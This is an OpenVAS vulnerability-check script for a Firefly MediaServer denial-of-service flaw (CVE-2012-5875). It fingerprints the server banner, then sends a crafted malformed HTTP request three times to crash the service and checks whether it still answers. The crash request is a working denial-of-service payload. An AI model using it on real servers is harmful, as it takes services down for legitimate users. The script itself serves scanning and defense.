##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_firefly_mediaserver_mult_dos_vuln.nasl 9352 2018-04-06 07:13:02Z cfischer $
#
# Firefly MediaServer HTTP Header Multiple DoS Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to cause the server
to crash, denying service to legitimate users.

Impact Level: Application";

tag_affected = "Firefly MediaServer version 1.0.0.1359 and prior";

tag_insight = "The flaw is due to multiple NULL pointer dereference errors
within the 'firefly.exe' when processing requests with malformed 'CONNECTION',
'ACCEPT-LANGUGE', 'USER-AGENT', and 'HOST' HTTP header value or malformed HTTP
protocol version.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running Firefly MediaServer and is prone to multiple
denial of service vulnerabilities.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803080");
  script_version("$Revision: 9352 $");
  script_cve_id("CVE-2012-5875");
  script_bugtraq_id(56999);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2012-12-20 15:49:00 +0530 (Thu, 20 Dec 2012)");
  script_name("Firefly MediaServer HTTP Header Multiple DoS Vulnerabilities");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/80743");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2012/Dec/114");
  script_xref(name : "URL" , value : "https://www.htbridge.com/advisory/HTB23129");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/118963/");

  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports(9999);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("http_func.inc");

## Variable Initialization
fmPort = 0;
fmRes = "";
fmReq = "";

## Get Firefly MediaServer default TCP Port
fmPort = 9999;
if(!get_port_state(fmPort)){
  exit(0);
}

banner = get_http_banner(port:fmPort);
## Confirm the application before trying exploit
if("Server: mt-daapd" >!< banner){
  exit(0);
}

host = http_host_name(port:fmPort);

## Construct and Send attack Request
fmExp = string("GET / HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
               "Accept-Language: en-us\r\n",
               "en;q=0.5\r\n",
               "\r\n",
               "\r\n",
               "Connection: keep-alive\r\n\r\n");

## Send crafted request
for(i=0; i<3; i++)
http_send_recv(port: fmPort, data:fmExp);

sleep(2);

## Send Normal Get request and check the response
fmRes = http_send_recv(port: fmPort, data:fmReq);

if(!fmRes)
security_message(fmPort);
